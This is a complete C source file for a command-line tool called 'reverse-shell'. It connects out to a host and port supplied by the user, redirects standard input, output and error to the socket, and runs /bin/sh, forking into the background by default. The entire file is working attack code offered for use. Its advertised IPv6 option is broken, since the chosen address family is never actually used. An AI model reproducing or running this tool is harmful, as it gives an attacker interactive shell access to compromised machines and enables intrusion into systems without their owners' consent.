#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>


#define PROGNAME	"reverse-shell"
#define SHELL		"sh"
#define PATH		"/bin"
#define PATHSHELL	PATH "/" SHELL


static void usage()
{
	fprintf(stderr, "usage: %s [options] <host> <port>\n", PROGNAME);
	fprintf(stderr, "options:\n");
	fprintf(stderr, "\t-h : display this and exit\n");
	fprintf(stderr, "\t-f : foreground mode (eg: no fork)\n");
	fprintf(stderr, "\t-6 : use IPv6 socket\n");
}


static void reverse_tcp(const char *host, const char *port, int family)
{
	int		sockfd;
	struct addrinfo	hints;
	struct addrinfo	*res;
	int		ret;
	char		*ex[3];

	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	if ( (ret = getaddrinfo(host, port, &hints, &res)) != 0 )
		return;

	if ( (sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) < 0 )
		return;

	if ( connect(sockfd, res->ai_addr, res->ai_addrlen) < 0 )
		return;

	/* Replace stdin, stdout and stderr from the socket
	 */
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	ex[0] = PATHSHELL;
	ex[1] = SHELL;
	ex[2] = NULL;

	execve(ex[0], &ex[1], NULL);

	/* Should never get here
	 */
}


int main(int argc, char *argv[])
{
	int	c;
	int	nofork = 0;
	pid_t	child;
	int		family = AF_INET;

	while ( (c = getopt(argc, argv, "hf6")) != -1 )
	{
		switch ( c )
		{
			case 'h':
			usage();
			return 0;

			case 'f':
			nofork = 1;
			break;

			case '6':
			family = AF_INET6;
			break;
		}
	}

	argv += optind;
	argc -= optind;

	if ( argc != 2 )
	{
		usage();
		return -1;
	}

	/* Fork and connect back
	 */
	if ( nofork || (child = fork()) == 0 )
		reverse_tcp(argv[0], argv[1], family);
	else
		printf("child pid: %d\n", child);

	return 0;
}
